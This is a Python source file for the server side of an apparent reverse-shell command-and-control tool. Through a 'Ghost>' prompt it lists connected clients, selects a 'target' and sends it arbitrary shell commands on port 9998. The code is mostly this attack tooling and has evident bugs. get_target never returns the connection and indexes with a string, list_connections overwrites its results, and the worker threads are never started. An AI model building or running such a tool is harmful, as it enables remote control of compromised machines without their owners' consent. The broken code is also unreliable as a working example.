import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER =[1,2]
queue = Queue()
all_connections = []
all_addressess = []

# Create a socket ( connects two computer )
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9998
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket execution created error {}".format(msg))

#  Binding the socket and listening for connection

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: {}".format(port))

        s.bind((host,port))
        s.listen(5)
    
    except socket.error as msg:
        print("Socket Binding error {} '\n' Retrying .....".format(msg))
        bind_socket()

# Handling connections from multiple clients and saving to a line
# Closing previous connections when server.py   file is restarted

def acceptin_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addressess[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)    # Prevent Timeout
            
            all_addressess.append(address)
            all_connections.append(conn)
            print("Connection has been esablished! IP : {0} | PORT : {1}".format(address[0],str(address[1])))

        except:
            print("Error accepting connection")
            continue

# 2nd Thread functions :- 1) see all the clients 2) select a client 3) send commands to connected client

def start_ghost():
    while True:
        cmd = input("Ghost> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        # elif cmd == 'quit':
        #     print("Ghost going offline")
        #     sys.exit(0)
        #     break
        else:
            print("Command not recognised")

# Display all active connections with clients

def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(2014780)
        except:
            del all_connections[i]
            del all_addressess[i]
            continue
        
        results = str(i) + " IP: " + str(all_addressess[i][0]) + " PORT: " + str(all_connections[i][1]) + "\n"

    print("***********Clients********** '\n'" + results)

# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace("select","")
        target = cmd.replace(" ","")
        conn = all_connections[int(target)]
        print("You are now connected to IP: {0} | PORT: {1}".format(str(all_addressess[target][0]),str(all_connections[target][1])))
        print(str(all_addressess[target][0])+"> ",end="")

    except:
        print("Selection not valid")

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_resp = str(conn.recv(20480),"utf-8")
                print("Client Response {}".format(client_resp),end="")
        except:
            print("Error sending command")
            break

# Create worker thread
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)   # Here we are creating thread and specifying which sort of work it should perform
        t.daemon = True # tells thread to release the memory after its execution finish or terminated


# Do next job that is their in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            acceptin_connections()
        if x == 2:
            start_ghost()

        queue.task_done()

def create_jobs():
    for j in JOB_NUMBER:
        queue.put(j)

    queue.join()

create_workers()
create_jobs()